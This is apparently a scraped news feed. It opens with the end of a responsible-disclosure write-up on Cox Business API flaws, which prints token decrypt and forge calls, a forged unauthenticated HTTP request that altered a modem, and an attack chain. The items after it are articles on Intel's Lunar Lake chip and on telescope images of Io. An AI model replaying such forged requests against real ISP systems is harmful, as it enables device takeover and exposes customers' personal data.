<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjan36pE.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function.</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0="</span>)
<span>"8042"</span>
</code></pre>
<p>Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an <code>encryptedValue</code> parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again:</p>
<pre><code>t.<span>cbHelper</span>.<span>decryptWithSaltandPadding</span>(<span>"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09"</span>)
<span>541051614702</span>;<span>DTC4131</span>;<span>333415591</span>;<span>1</span>;<span>f4</span>:<span>c1</span>:<span>14</span>:<span>70</span>:4<span>d</span>:ac;<span>Internet</span>
</code></pre>
<p>Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters.</p>
<pre><code><span>541051614702</span> <span>=</span> <span>Cox</span> <span>Account</span> <span>Number</span>
<span>DTC4131</span> <span>=</span> <span>Device</span> <span>Name</span>
<span>333415592</span> <span>=</span> <span>Device</span> <span>ID</span>
<span>1</span> <span>=</span> <span>Unknown</span>
<span>f4:c1:14:70:4d:ac</span> <span>=</span> <span>MAC</span> <span>address</span>
<span>Internet</span> <span>=</span> <span>Label</span>
</code></pre>
<p>If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further.</p>
<h2 id="executing-commands-on-any-modem">Executing Commands on Any Modem</h2>
<p>On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. <code>123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING</code>) to see if it actually validated that the account ID matched the MAC address:</p>
<pre><code>t.<span>cbHelper</span>.<span>encryptWithSaltandPadding</span>(<span>"123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING"</span>)
<span>OGEzMjNmNjFhOTk</span>2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpLUlArd3Jqek5Ra3VlZUVReXVUWEZHbE91NWVQRzk0WEo1Zi9wSDdVZWxHVkFXYmtWd2Z2YmNHU1FWOVRFT2prZm5tNFhWZlQwNkQ3V2tDU1FqbHpIUT09
</code></pre>
<p>The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID.</p>
<p>I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain.</p>
<p>I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware:</p>
<pre><code><span>POST</span> <span>/api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:123.0)</span> <span>Gecko/20100101</span> <span>Firefox/123.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>
<span>Cb_session:</span> <span>unauthenticateduser</span>
<span>Authorization:</span> <span>Bearer</span> <span>undefined</span>
<span>Ma_transaction_id:</span> <span>56583255</span><span>-1cf3-41aa-9600-3d5585152e87</span>
<span>Connection:</span> <span>close</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>431</span>

{
  <span>"wifiSettings":</span> {
    <span>"customerWifiSsid24":</span> <span>"Curry"</span>
  },
  <span>"additionalProperties":</span> {
    <span>"customerWifiSsid24":</span> [
      <span>"Curry"</span>
    ]
  },
  <span>"encryptedValue":</span> <span>"T0dFek1qTm1OakZoT1RrMk1HSTJPVE0wTnpBek5Ua3pPRFprT0dZeE9ESTZPamhoTnpVMU5UTmxNREF6T1RsaE5XUTVaams1WlRZek16TTNNMlJpWVdVek9qcENVMlp1TjJ0blVsTkNlR1ZhZDJsd05qZGhjWFo0TTJsaVJHSkhlU3N2TUhWVWFYZzJWVTByYzNsT2RYWklMek16VjJ4VldFYzJTMWx5VEVNMVRuSkxOVVF3VFhFek9UVmlUR2RGVFd4RUt6aGFUMnhoZHowOQ=="</span>
}
</code></pre>
<pre><code>HTTP/<span>1.1</span> <span>200</span> OK
Server<span>:</span> nginx

<span>{</span>
  <span>"message"</span><span>:</span> <span>"Success"</span>
<span>}</span>
</code></pre>
<p>Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must've reset my device.</p>
<p>About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone's device using this exploit.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FAQLhEU7.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could've accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could've used this access to exploit any of the millions of Cox devices that were accessible through these APIs.</p>
<p>I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day.</p>
<h2 id="impact">Impact</h2>
<p>This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could've executed commands and modified the settings of millions of modems, accessed any business customer's PII, and gained essentially the same permissions of an ISP support team.</p>
<p>Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states.</p>
<p>An example attack scenario would've looked like the following:</p>
<ol>
<li>Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number</li>
<li>Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address</li>
<li>Query their hardware MAC address to retrieve Wifi password and connected devices</li>
<li>Execute arbitrary commands, update any device property, and takeover victim accounts</li>
</ol>
<p>There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands.</p>
<h2 id="addendum">Addendum</h2>
<p>After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post.</p>
<p>I'm still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could've been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network).</p>
<p>One of the things I'll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd.</p>
<p>Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>03/04/2024 - Vulnerability reported to Cox via their <a href="https://www.cox.com/aboutus/policies/cox-security-responsible-disclosure-policy.html">responsible disclosure program</a></li>
<li>03/05/2024 - Vulnerability is hot-patched, all non-essential business endpoints return 403 and no longer function</li>
<li>03/06/2024 - Email Cox that I can no longer reproduce the vulnerability</li>
<li>03/07/2024 - Cox writes that they are beginning a comprehensive security review</li>
<li>04/10/2024 - Informed Cox of intent to disclose 90 days from disclosure</li>
<li>04/29/2024 - Shared link to blog post draft with Cox</li>
</ul>
<h2 id="thanks">Thanks</h2>
<ul>
<li>Thanks to <a href="https://twitter.com/blastbots">@blastbots</a> for the full redesign of the blog, I can now write posts in markdown and have an RSS feed!</li>
<li>Thanks to <a href="https://twitter.com/sshell_">Justin Rhinehart</a> and <a href="https://twitter.com/birchb0y">Alden</a> for working closely with me for the investigation process, providing tons of help doing OSINT stuff.</li>
<li>Thanks to <a href="https://twitter.com/galnagli">Gal Nagli</a>, <a href="https://twitter.com/bbuerhaus">Brett Buerhaus</a>, <a href="https://twitter.com/avlidienbrunn">Mathias Karlsson</a>, <a href="https://twitter.com/d0nutptr">Nathanial Lattimer</a>, <a href="https://twitter.com/xEHLE_">Maik Robert</a>, <a href="https://twitter.com/infosec_au">Shubham Shah</a>, <a href="https://twitter.com/0xteknogeek">Joel Margolis</a>, <a href="https://twitter.com/Rhynorater">Justin Gardner</a>, Daley Borda, <a href="https://twitter.com/umasiii">William Tom</a>, and Ebrietas for reviewing the draft version of this blog post.</li>
<li>Thanks to the Cox Communications security team for quickly fixing the issue and staying in touch throughout the process.</li>
</ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel Unveils Lunar Lake Architecture (128 pts)]]></title>
            <link>https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4</link>
            <guid>40570356</guid>
            <pubDate>Tue, 04 Jun 2024 03:17:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4">https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4</a>, See on <a href="https://news.ycombinator.com/item?id=40570356">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>

                

<div>
    <nav>
        <ul>
            <li><a href="https://www.anandtech.com/">Home</a><span>&gt;</span></li>
                <li><a href="https://www.anandtech.com/tag/socs">SoCs</a></li>
        </ul>
        
    </nav>

    
    
</div>





    
    

<div>

                <p><img src="https://images.anandtech.com/doci/21425/LL_Car3_678x452.jpg" alt="">
                </p>

            


        <div>
            <p>Intel this morning is lifting the lid on&nbsp;some of the finer architectural and technical details about its upcoming Lunar Lake SoC – the chip that will be the next generation of Core Ultra mobile processors. Once again holding one of their increasingly regular Tech Tour events for media and analysts, Intel this time set up shop in Taipei just before the beginning of Computex 2024. During the Tech Tour, Intel disclosed numerous facets of Lunar Lake, including their new P-Core design codenamed <em>Lion Cove</em> and a new wave of E-cores that are a bit more like Meteor Lake's pioneering Low Power Island E-Cores. Also disclosed was the Intel NPU 4, which Intel claims delivers up to 48 TOPS, surpassing&nbsp;Microsoft's Copilot+ requirements for the new age of AI PCs.</p>

<p>Intel's Lunar Lake represents a strategic evolution in their mobile SoC lineup, building on their Meteor Lake launch last year, focusing&nbsp;on&nbsp;enhancing power efficiency and optimizing performance across the board. Lunar Lake dynamically allocates tasks to efficient cores (E-cores) or performance cores (P-cores) based on workload demands by leveraging advanced scheduling mechanisms, which are assigned to ensure optimal power usage and performance. Still, once again, Intel Thread Director, along with Windows 11, plays a pivotal role in this process, guiding the OS scheduler to make real-time adjustments that balance efficiency with computational power depending on the intensity of the workload.</p>

<table>
	<tbody>
		<tr>
			<td colspan="6">Intel CPU Architecture Generations</td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td>Alder/Raptor Lake</td>
			<td>Meteor<br>
			Lake</td>
			<td><b>Lunar<br>
			Lake</b></td>
			<td>Arrow<br>
			Lake</td>
			<td>Panther<br>
			Lake</td>
		</tr>
		<tr>
			<td>P-Core Architecture</td>
			<td>Golden Cove/<br>
			Raptor Cove</td>
			<td>Redwood Cove</td>
			<td><strong>Lion Cove</strong></td>
			<td>Lion Cove</td>
			<td>Cougar Cove?</td>
		</tr>
		<tr>
			<td>E-Core Architecture</td>
			<td>Gracemont</td>
			<td>Crestmont</td>
			<td><strong>Skymont</strong></td>
			<td>Crestmont?</td>
			<td>Darkmont?</td>
		</tr>
		<tr>
			<td>GPU Architecture</td>
			<td>Xe-LP</td>
			<td>Xe-LPG</td>
			<td><strong>Xe2</strong></td>
			<td>Xe2?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>NPU Architecture</td>
			<td>N/A</td>
			<td>NPU 3720</td>
			<td><strong>NPU 4</strong></td>
			<td>?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>Active Tiles</td>
			<td>1 (Monolithic)</td>
			<td>4</td>
			<td><strong>2</strong></td>
			<td>4?</td>
			<td>?</td>
		</tr>
		<tr>
			<td>Manufacturing Processes</td>
			<td>Intel 7</td>
			<td>Intel 4 + TSMC N6 + TSMC N5</td>
			<td><strong>TSMC N3B + TSMC N6</strong></td>
			<td>Intel 20A + More</td>
			<td>Intel 18A</td>
		</tr>
		<tr>
			<td>Segment</td>
			<td>Mobile + Desktop</td>
			<td>Mobile</td>
			<td><strong>LP Mobile</strong></td>
			<td>HP Mobile + Desktop</td>
			<td>Mobile?</td>
		</tr>
		<tr>
			<td>Release Date (OEM)</td>
			<td>Q4'2021</td>
			<td>Q4'2023</td>
			<td><strong>Q3'2024</strong></td>
			<td>Q4'2024</td>
			<td>2025</td>
		</tr>
	</tbody>
</table>

<h3>Lunar Lake: Designed By Intel, Built By TSMC (&amp; Assembled By Intel)</h3>

<p>While there are many aspects of Lunar Lake to dive into, perhaps it's best we start with what's sure to be the most eye-catching: who's building it.</p>

<p>Intel's Lunar Lake tiles are not being fabbed using any of their own foundry facilities – a sharp departure from historical precedence, and even the recent Meteor Lake, where the compute tile was made using the Intel 4 process. Instead, both tiles of the disaggregated Lunar Lake are being fabbed over at TSMC, using a mix of TSMC's N3B and N6 processes. In 2021 Intel set about freeing their chip design groups to use the best foundry they could – be it internal or external – and there's no place that's more apparent than here.</p>

<p>Overall, Lunar Lake represents their second generation of disaggregated SoC architecture for the mobile market, replacing the Meteor Lake architecture in the lower-end space.&nbsp;At this time, Intel has disclosed that it uses a 4P+4E (8 core) design, with hyper-threading/SMT disabled, so the total thread count supported by the processor is simply the number of CPU cores, e.g., 4P+4E/8T.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-49.png"></a></p>

<p>The build-up of Lunar Lake combines a synergetic collaboration between Intel’s architectural design team and TSMC's manufacturing process nodes to bring the latest Lion Cove P-cores to Lunar Lake, which boosts Intel's architectural IPC as you would expect from a new generation. At the same time, Intel also&nbsp;introduces the Skymont E-cores, which replace the Low Power Island Cresmont E-cores of Meteor Lake. Notably, however, these E-cores don't connect to the ring bus like the P-cores, which makes them a sort of hybrid LP E-core, combining the efficiency gains of the more advanced TSMC N3B node with the double-digit gains in IPC over the previous Crestmont cores.</p>

<p>The entire compute tile, including the P and E-cores, is built on TSMC's N3B node, while the SoC tile is made using the TSMC N6 node.</p>

<p>At a higher level, Intel is once again using their Foveros packaging technology here. Both the compute and SoC (now the "Platform Controller") tiles sit on top of a base tile, which provides high-speed/low-power routing between the tiles, and further connectivity to the rest of the chip and beyond.</p>

<p>In another first for a mainstream Intel Core product, the Lunar Lake SoC platform also&nbsp;includes up to 32 GB of LPDDR5X memory on the chip package itself. This is arranged as a pair of 64-bit memory chips, offering a total 128-bit memory interface. As with other vendors using on-package memory, this change means that users can't just upgrade DRAM at-will, and the memory configurations for Lunar Lake will ultimately be determined by what SKUs Intel opts to ship.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_AI%20on%20Client%20PCs-51.png"></a></p>

<p>With Lunar Lake, Intel is also strongly focusing on AI, as the architecture integrates a new NPU called NPU 4. This NPU is rated for up to 48 TOPS of INT8 performance, thus making it Microsoft Copilot+ AI PC ready. This is the bar all of the PC SoC vendors are aiming for, including AMD and Qualcomm too.</p>

<p>Intel's integrated GPU will also be a contributing player here. While not the highly efficient machine that the dedicated NPU is, the Arc Xe2-LPG brings dozens of additional T(FL)OPS of performance with it, and some additional flexibility an NPU doesn't come with. Which is why you'll also see Intel rating the performance of these chips in terms of total platform TOPS – in this case, 120 TOPS.</p>

<p>Intel's collaboration with Microsoft further enhances workload management through the fabled Intel Thread Director, optimized for applications such as the Copilot assistant. Given the time of the introduction of Lunar Lake, it somewhat sets the stage for a Q3 2024 launch, which coincides with the&nbsp;holiday 2024 market.</p>

<h3>Intel Lunar Lake: Updating Intel Thread Director &amp; Power Management Improvements</h3>

<p>To say that energy efficiency is a key goal for Lunar Lake would be an understatement. For as much as Intel is riding high in the mobile PC CPU market (AMD's share there is still but a fraction), the company has been feeling the pressure over the last few years from customer-turned-rival Apple, whose M-series Apple Silicon has been setting the bar for power efficiency over the last few years. And now with Qualcomm attempting to do the same things for the Windows ecosystem with their forthcoming Snapdragon X chips, Intel is preparing to make their own power play.</p>

<p>Intel's Thread Director and power management updates for Lunar Lake show various and significant improvements compared to Meteor Lake. The Thread Director uses a heterogeneous scheduling policy, initially assigning tasks to a single E-core and expanding to other E-cores or P-cores as and when needed. OS containment zones are designed to limit tasks to specific cores, which directly improves power efficiency and delivers the performance needed by the right core for the workload at hand.&nbsp;Integration with power management systems and a quad array of Power Management Controllers (PMC) further allows the chip, in concert with Windows 11, to make context-aware adjustments, ensuring optimal performance with minimal power usage and wastage.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-04.png"></a></p>

<p>Lunar Lake's scheduling strategy effectively handles power-sensitive applications. One example Intel gave is that&nbsp;video conferencing tasks are kept within the efficiency core cluster, utilizing the E-cores to maintain performance while reducing power consumption by up to 35%, as shown by Intel's provided data. These improvements are achieved through collaboration with OS developers such as Microsoft for seamless integration for optimizing for the best balance between power consumption and performance.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-19.png"></a></p>

<p>Focusing on the power management system for Lunar Lake, Intel uses its SoC power management, operating in efficiency, balance, and performance modes tailored and designed to adapt to whatever the demands of the workload at the time of operation. This multi-layered approach allows the Lunar Lake SoC to operate efficiently. Again,&nbsp;much like the Intel&nbsp;Thread Director, the PMCs can&nbsp;balance power usage with performance needs.</p>

<p><a href="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"><img alt="" src="https://images.anandtech.com/doci/21425/Intel_Tech%20Tour%20TW_Lunar%20Lake%20Power%20Management%20%26%20Thread%20Director%20Innovations-17.png"></a></p>

<p>Intel further plans to enhance the Thread Director by increasing scenario granularity, implementing AI-based scheduling hints, and enabling cross-IP scheduling within Windows 11. These enhancements essentially equate to workload management designed to boost overall power efficiency and deliver performance across various applications when needed without wasting power budget by allocating lighter tasks to the higher power P-cores.</p>

<p>Over the next few pages, we'll explore the new P and E cores and Intel's update to ther integrated Arc Xe (Xe2-LPG) graphics.</p>

        </div>
        <p><a href="https://www.anandtech.com/show/21425/intel-lunar-lake-architecture-deep-dive-lion-cove-xe2-and-npu4/2">Intel Lunar Lake: New P-Core, Enter Lion Cove</a>

                
        </p>
            
            
            
            
            


</div>

    



            </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel's Lion Cove Architecture Preview (126 pts)]]></title>
            <link>https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/</link>
            <guid>40570326</guid>
            <pubDate>Tue, 04 Jun 2024 03:11:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/">https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/</a>, See on <a href="https://news.ycombinator.com/item?id=40570326">Hacker News</a></p>
Couldn't get https://chipsandcheese.com/2024/06/03/intels-lion-cove-architecture-preview/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[New telescope images of Jupiter's moon Io rival those from spacecraft (152 pts)]]></title>
            <link>https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html</link>
            <guid>40569949</guid>
            <pubDate>Tue, 04 Jun 2024 01:57:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html">https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html</a>, See on <a href="https://news.ycombinator.com/item?id=40569949">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/glimpses-of-a-volcanic.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/glimpses-of-a-volcanic.jpg" data-sub-html="The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/glimpses-of-a-volcanic.jpg" alt="Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft" title="The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA" width="800" height="530">
             <figcaption>
                The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA
            </figcaption>        </figure>
    </div><p>New images of Jupiter's volcano-studded moon Io, taken by the Large Binocular Telescope on Mount Graham in Arizona, offer the highest resolution of Io ever achieved with an Earth-based instrument. The observations were made possible by a new high-contrast optical imaging instrument, dubbed SHARK-VIS, and the telescope's adaptive optics system, which compensates for the blurring induced by atmospheric turbulence.</p>


										      
																																	<p>The images, to be published in the journal <i>Geophysical Research Letters</i>, reveal surface features as small as 50 miles across, a spatial resolution that until now had been achievable only with spacecraft sent to Jupiter. This is equivalent to taking a picture of a dime-sized object from 100 miles away, according to the research team.</p>
<p>SHARK-VIS allowed the researchers to identify a major resurfacing event around Pele, one of Io's most prominent volcanoes. According to the paper's first author, Al Conrad, the eruptions on Io, the most volcanically active body in the solar system, dwarf their contemporaries on Earth.</p>
<p>"Io, therefore, presents a unique opportunity to learn about the mighty eruptions that helped shape the surfaces of the Earth and the moon in their distant pasts," said Conrad, associate staff scientist at the Large Binocular Telescope Observatory. The Large Binocular Telescope, or LBT, is part of Mount Graham International Observatory, a division of the University of Arizona Steward Observatory.</p>
<p>Conrad added that studies like this one will help researchers understand why some worlds in the solar system are volcanic but not others. They also may someday shed light on volcanic worlds in exoplanet systems around nearby stars.</p>
<p>Slightly larger than Earth's moon, Io is the innermost of Jupiter's Galilean moons, which in addition to Io, include Europa, Ganymede and Callisto. Locked in a gravitational "tug of war" among Jupiter, Europa and Ganymede, Io is constantly being squeezed, leading to frictional heat buildup in its interior—believed to be the cause for its sustained and widespread volcanic activity.</p>

																																						
																																			<p>By monitoring the eruptions on Io's surface, scientists hope to gain insights into the heat-driven movement of material underneath the moon's surface, its internal structure and ultimately, on the tidal heating mechanism responsible for Io's intense volcanism.</p>
<p>Io's volcanic activity was first discovered in 1979, when Linda Morabito, an engineer on NASA's Voyager mission, spotted an eruption plume in one of the images taken by the spacecraft during its famous "Grand Tour" of the outer planets. Since then, countless observations have been made that document Io's restless nature, from both space and Earth-based telescopes.</p>

<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/glimpses-of-a-volcanic-1.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/glimpses-of-a-volcanic-1.jpg" data-sub-html="Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/glimpses-of-a-volcanic-1.jpg" alt="Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft" title="Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi">
             <figcaption>
                Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi
            </figcaption>        </figure>
    </div>
<p>Study co-author Ashley Davies, a principal scientist at NASA's Jet Propulsion Laboratory, said the new image taken by SHARK-VIS is so rich in detail that it has allowed the team to identify a major resurfacing event in which the plume deposit around a prominent volcano known as Pele, located in Io's southern hemisphere close to the equator, is being covered by eruption deposits from Pillan Patera, a neighboring volcano. A similar eruption sequence was observed by NASA's Galileo spacecraft, which explored the Jupiter system between 1995 and 2003.</p>
<p>"We interpret the changes as dark lava deposits and white sulfur dioxide deposits originating from an eruption at Pillan Patera, which partially cover Pele's red, sulfur-rich plume deposit," Davies said. "Before SHARK-VIS, such resurfacing events were impossible to observe from Earth."</p>

